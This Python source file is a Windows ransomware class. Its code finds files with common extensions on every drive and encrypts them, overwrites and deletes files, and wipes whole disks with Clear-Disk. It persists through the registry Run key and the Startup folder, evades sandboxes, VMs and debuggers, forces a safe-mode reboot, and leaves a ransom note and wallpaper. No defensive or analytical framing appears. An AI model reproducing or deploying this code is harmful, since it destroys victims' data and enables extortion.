import os
import re
import sys
import string
import random
import signal
import psutil
import threading
import pyautogui
import subprocess
from winreg import *
import multiprocessing
from ctypes import windll
from shutil import copyfile
from Cryptodome import Random
from pynput.mouse import Controller
from Cryptodome.PublicKey import RSA
from cryptography.fernet import Fernet
from getmac import get_mac_address as gma
from PIL import Image, ImageFont, ImageDraw

class ransomware:
    mouse_controller = Controller()
    current_path = os.path.realpath(sys.argv[0])
    desktop_path = os.path.join(os.path.expanduser("~"), "Desktop")
    note_path = os.path.join(desktop_path, "Note.txt")
    
    root_files = ["C:\\", "D:\\", "E:\\", "F:\\", "H:\\", "I:\\", "J:\\", "K:\\", "L:\\", "M:\\", "N:\\", "O:\\", "P:\\", "Q:\\", "R:\\", "S:\\", "T:\\", "U:\\", "V:\\", "W:\\", "X:\\", "Y:\\", "Z:\\"]
    wanted_files = []
    
    #Extensions
    file_extensions = ['.3ds', '.7z', '.aac', '.accdb', '.accdc', '.accde', '.accdr', '.accdt', '.accdw', '.adts', '.asp', '.aspx', '.avi', '.back', '.bak', '.bmp', '.c', '.cda', '.cfg', '.class', '.conf', '.cpp', '.cs', '.csv', '.db', '.dbf', '.disk', '.djvu', '.doc', '.docm', '.docx', '.dot', '.dotx', '.dwg', '.eml', '.eps', '.fdb', '.gif', '.gz', '.h', '.hdd', '.htm', 
        '.iso', '.jar', '.java', '.jpeg', '.jpg', '.js', '.kdbx', '.laccdb', '.m4a', '.mail', '.mdb', '.mp3', '.mp4', '.mpeg', '.mpg', '.msg', '.nrg', '.ora', '.ost', '.ova', '.ovf', '.pdf', '.php', '.pmf', '.png', '.pot', '.potm', '.potx', '.pps', '.ppsm', '.ppsx', '.ppt', '.pptm', '.pptx', '.psd', '.pst', '.py', '.pyc', '.rar', '.rtf', '.sldm', '.sldx', '.sln', '.sql', '.sqlite', '.sqlite3', '.sqlitedb', '.swf', '.tar', '.tif', '.tiff', '.txt', '.vbox', '.vbs', '.vcb', '.vdi', '.vfd', '.vmc', '.vmdk', '.vmsd', '.vmx', '.vob', '.vsdm', '.vsdx', '.vss', '.vssm', '.vstx', '.vsv', '.wav', '.wks', '.wma', '.wmd', '.wmv', '.work', '.wp5', '.wpd', '.xla', '.xlam', '.xlm', '.xls', '.xlsm', '.xlsx', '.xlt', '.xltm', '.xltx', '.xvd', '.zip']
    
    def __init__(self):
        self.key = None
        self.crypter = None
        self.private_key = None
        self.public_key = None
        self.running_processes = str(subprocess.check_output("tasklist", shell=True)).lower()
        
        self.temp_folder = os.getenv("TEMP")
        self.app_data = os.getenv("APPDATA")
        self.startup_path = r"C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp"
        self.register_name = "LastBatterySqm"
        
        self.extensions = self.file_extensions.copy()
        temp_list = []
        
        for file in self.root_files:
            if os.path.exists(file):
                temp_list.append(file)
        
        self.root_files = temp_list.copy()

    def generate_keys(self):
        random = Random.new().read
        key = RSA.generate(4096, random)
        
        private = key.exportKey()
        public = key.public_key().exportKey()
        
        self.private_key = private
        self.public_key = public
    
    def wipe_file(self, path, times_to_repeat=5):
        try:
            for i in range(times_to_repeat):
                data = self.encode_b64(self.generate_random_string(400))
                file = open(path, 'w')
                
                file.write(data)                                            
                file.close()            
            
            name = self.generate_random_string(30)
            os.rename(path, name)
            os.unlink(name)
        except Exception:
            pass

    def write_to_registry(self):
        try:
            self.copy_to_startup()
            reg_key = OpenKey(HKEY_LOCAL_MACHINE, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, KEY_ALL_ACCESS)
            
            SetValueEx(reg_key, self.register_name, 0, REG_SZ, os.path.join(self.startup_path, os.path.basename(self.current_path)))
            CloseKey(reg_key)
        except Exception:
            pass

    def hardware_tests(self):
        if multiprocessing.cpu_count() == None or multiprocessing.cpu_count() < 2:
            return True            
        if psutil.virtual_memory().total < 2900000000:
            return True
        
        dlihuy853t7efg = str(self.run_powershell_command("Get-WmiObject -Class Win32_Fan"))
        if dlihuy853t7efg == None or len(dlihuy853t7efg ) == 0 or "ObjectNotFound" in dlihuy853t7efg:
            return True
        
        return False
        
    def kill_process(self, names):
        try:
            for name in names:
                for process in psutil.process_iter():
                    if str(name) in process.name():
                        process_pid = process.pid                     
                        os.kill(int(process_pid), signal.SIGTERM)

            return True
        except Exception:
            return False

    def mouse_movement(self):
        counter = 0
        current_position = self.mouse_controller.position
        
        while counter < 2000:
            old_position = self.mouse_controller.position
            if current_position != old_position:
                current_position = old_position
                counter += 1

    def copy_to_startup(self):
        try:
            if not os.getcwd() == self.startup_path:
                copyfile(self.current_path, os.path.join(self.startup_path, os.path.basename(self.current_path)))
        except Exception:
            pass

    def generate_fernet(self):
        self.key = Fernet.generate_key()
        self.crypter = Fernet(self.key)

    def delete_keys(self):
        del self.key
        del self.crypter
        del self.private_key
        del self.public_key

    #Encrypt file (TODO - RIPlace)
    def encrypt_file(self, path):
        try:
            with open(path, 'rb') as file:
                data = file.read()
                encrypted_data = self.crypter.encrypt(data)
            
            with open(path, 'wb') as file:
                file.write(encrypted_data)
        except Exception:
            pass

    def evade_detection(self):
        if not self.is_windows():
            return False
        elif self.is_sandbox():
            return False
        elif self.is_vm():
            return False
        elif self.hardware_tests():
            return False
        elif self.is_on_debug():
            return False
        
        self.mouse_movement()        
        return True

    def is_on_debug(self):
        try:
            return windll.kernel32.IsDebuggerPresent() != 0
        except Exception:
            return True

    def encrypt_system(self):
        try:
            threads = []        
            for file in self.wanted_files:
                thread = threading.Thread(target=self.encrypt_file, args=(file, ))
                thread.daemon = True
                threads.append(thread)
            
            for t in threads:
                t.start()
            
            for t in threads:
                t.join()                
        except Exception:
            pass

    def remove_from_registry(self):
        try:            
            reg = OpenKey(HKEY_LOCAL_MACHINE, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, KEY_ALL_ACCESS)
            
            DeleteValue(reg, self.register_name)
            CloseKey(reg)
        except Exception:
            pass

    def enumerate_directory(self, directory_path):
        try:
            for root, dir, files in os.walk(directory_path):
                for file in files:
                    file_path = os.path.join(root, file)
                    tmp, extension = os.path.splitext(file_path)                 
                    
                    if extension.lower() in self.extensions:
                        self.wanted_files.append(file_path)
        except Exception:
            pass
    
    def get_all_files(self):
        try:
            threads = []
            for file in self.root_files:
                thread = threading.Thread(target=self.enumerate_directory, args=(file, ))
                thread.daemon = True
                threads.append(thread)

            for t in threads:
                t.start()
            
            for t in threads:
                t.join()
        except Exception:
            pass
        
    def is_sandbox(self):
        try:
            known_processes = ['Wireshark.exe', 'Fiddler.exe', 'Procmon64.exe', 'Procmon.exe', 'Procexp.exe', 'Procexp64.exe', 'Sysmon64.exe', 'Sysmon.exe', 'ProcessHacker.exe', 'OllyDbg.exe', 'ImmunityDebugger.exe', 'x64dbg.exe', 'x32dbg.exe', 'Windbgx64.exe', 'Windbgx86.exe']
            for process in known_processes:
                if process.lower() in self.running_processes:
                    return True
            
            return False
        except Exception:
            return True
    
    def wipe_system(self):
        try:
            threads = []
            for file in self.wanted_files:
                thread = threading.Thread(target=self.wipe_file, args=(file, ))
                thread.daemon = True
                threads.append(thread)
            
            for t in threads:
                t.start()
            
            for t in threads:
                t.join()
        except Exception:
            pass

    def is_windows(self):
        try:
            return os.name == "nt"
        except Exception:
            return False

    def is_vm(self):
        try:
            services_running = self.run_powershell_command("get-service")
            
            known_services = ['VMTools', 'Vmhgfs', 'VMMEMCTL', 'Vmmouse', 'Vmrawdsk', 'Vmusbmouse', 'Vmvss', 'Vmscsi', 'Vmxnet', 'vmx_svga', 'Vmware Tools', 'Vmware Physical Disk Helper Service']
            for service in known_services:
                if service.lower() in services_running:
                    return True
            
            known_files = ['C:\\windows\\System32\\Drivers\\Vmmouse.sys', 'C:\\windows\\System32\\Drivers\\vm3dgl.dll', 'C:\\windows\\System32\\Drivers\\vmdum.dll', 'C:\\windows\\System32\\Drivers\\vm3dver.dll', 'C:\\windows\\System32\\Drivers\\vmtray.dll', 'C:\\windows\\System32\\Drivers\\VMToolsHook.dll', 'C:\\windows\\System32\\Drivers\\vmmousever.dll', 'C:\\windows\\System32\\Drivers\\vmhgfs.dll', 'C:\\windows\\System32\\Drivers\\vmGuestLib.dll', 'C:\\windows\\System32\\Drivers\\VmGuestLibJava.dll', 'C:\\windows\\System32\\Driversvmhgfs.dll', 'C:\\windows\\System32\\Drivers\\VBoxMouse.sys', 'C:\\windows\\System32\\Drivers\\VBoxGuest.sys', 'C:\\windows\\System32\\Drivers\\VBoxSF.sys', 'C:\\windows\\System32\\Drivers\\VBoxVideo.sys', 'C:\\windows\\System32\\vboxdisp.dll', 'C:\\windows\\System32\\vboxhook.dll', 'C:\\windows\\System32\\vboxmrxnp.dll', 'C:\\windows\\System32\\vboxogl.dll', 'C:\\windows\\System32\\vboxoglarrayspu.dll', 'C:\\windows\\System32\\vboxoglcrutil.dll', 'C:\\windows\\System32\\vboxoglerrorspu.dll', 'C:\\windows\\System32\\vboxoglfeedbackspu.dll', 'C:\\windows\\System32\\vboxoglpackspu.dll', 'C:\\windows\\System32\\vboxoglpassthroughspu.dll', 'C:\\windows\\System32\\vboxservice.exe', 'C:\\windows\\System32\\vboxtray.exe', 'C:\\windows\\System32\\VBoxControl.exe']
            for file in known_files:
                if os.path.exists(file) and os.path.isfile(file):
                    return True
            
            known_processes = ['Vmtoolsd.exe', 'Vmwaretrat.exe', 'Vmwareuser.exe', 'Vmacthlp.exe', 'vboxservice.exe', 'vboxtray.exe']
            for process in known_processes:
                if process.lower() in self.running_processes:
                    return True
            
            known_mac_addresses = ['00:05:69', '00:0C:29', '00:1C:14', '00:50:56', '08:00:27']
            for address in known_mac_addresses:
                if address == str(gma()):
                    return True
            
            return False
        except Exception:
            return True

    def text_to_image(self, text):
        try:            
            font = ImageFont.truetype("arial", 80)
            width, height = pyautogui.size()

            image = Image.new('L', (width, height), color='black')
            drawn_image = ImageDraw.Draw(image)
            drawn_image.text((width / 4, height / 2), text, fill=255, font=font)
            
            return image
        except Exception:
            pass

    #Already executed (TODO)
    def already_executed(self):
        try:
            for dirpath, dirnames, filenames in os.walk(r"C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp"):
                if os.path.basename(self.current_path) in filenames:
                    return True
        
            return False
        except Exception:
            pass
    
    def string_to_ascii(self, str):
        try:
            if str == None or len(str) == 0:
                return None
            if type(str) == bytes:
                str = str.decode()
            
            return [str(ord(i)) for i in str]            
        except Exception:
            return None

    def run_powershell_command(self, command):
        try:
            return str(subprocess.run(["powershell", "-Command", command], capture_output=True))
        except Exception:
            pass

    def get_disks_id(self):
        disks = self.run_powershell_command("Get-Disk")
        disks_id = []
        disks.strip().replace("\\r", "").replace("-", "").replace("\\n", "").strip()
        
        try:
            if self.get_substring("returncode=", disks, 1) == "0":
                stdout = self.get_substring("stdout=", disks)                    
                all_numbers = re.findall("([0-9]+)", stdout)
                for number in all_numbers:
                    if len(number) <= 2 and int(number) >= 0 and int(number) <= 23:
                        disk_id = self.run_powershell_command("Get-Disk -Number {}".format(number))
                        if "ObjectNotFound" in disk_id or "FullyQualifiedErrorId" in disk_id:
                            continue                      
                        
                        disks_id.append(number)
        except Exception:
            return None
        
        return disks_id

    def wipe_disk(self, disk_id):
        try:
            command = "Clear-Disk -Number {} -RemoveData -RemoveOEM -AsJob".format(disk_id)
            self.run_powershell_command(command)
        except Exception:
            pass

    def generate_random_string(self, length):
        try:
            return "".join(random.choice(string.ascii_uppercase + string.digits) for i in range(length))
        except Exception:
            pass        

    def create_note(self):
        try:
            with open(self.note_path, 'w') as file:
                file.write("If you see this text, then all of your files including your Photos, Documents, Videos... have been encrypted.\nThey are NO LONGER accessible.\nPlease save yourself a couple of hours, by not searching for a decryption service, because that won't work.\n\nHow to get my files back?\nTo get your files back you will need to donate at least 50$ to charity.\nWe will detect the donation and decrypt all of your files.\n\nPlease do not modify the encrypted files or we might not be able to restore them.")
            
            return True
        except Exception:
            return False
    
    def wipe_disks(self):
        try:
            disks_id = self.get_disks_id()
            if disks_id == None:
                pass

            threads = []     
            for id in disks_id:
                thread = threading.Thread(target=self.wipe_disk, args=(id, ))
                thread.daemon = True
                threads.append(thread)
            
            for t in threads:
                t.start()
            
            for t in threads:
                t.join()
        except Exception:
            pass

    #TODO
    def reboot_into_safe_mode(self):
        try:            
            #Hijack using MBR            
            os.system(r'cmd /k "{}"'.format("bcdedit /set {default} safeboot minimal"))
            os.system("shutdown /r /t 0")
        except Exception:
            return False

    def get_substring(self, what_string, where_string, from_where = None):
        try:
            index = where_string.index(what_string) + len(what_string)
            if from_where == None:
                return where_string[index:]    
            
            return where_string[index:index+from_where]
        except Exception:
            pass

    def add_notes(self):
        try:
            result = self.kill_process(["wallpaper32.exe", "wallpaper64.exe"])
            if result == True:
                background_image_path = os.path.join(self.temp_folder, "WindowsFirewallIcon.png")
                note_result = self.create_note()

                if note_result == True:
                    image = self.text_to_image("Find Note.txt on the Desktop")
                    image.save(background_image_path)
                    
                    windll.user32.SystemParametersInfoW(20, 0,  background_image_path, 0)                
        except Exception:
            pass
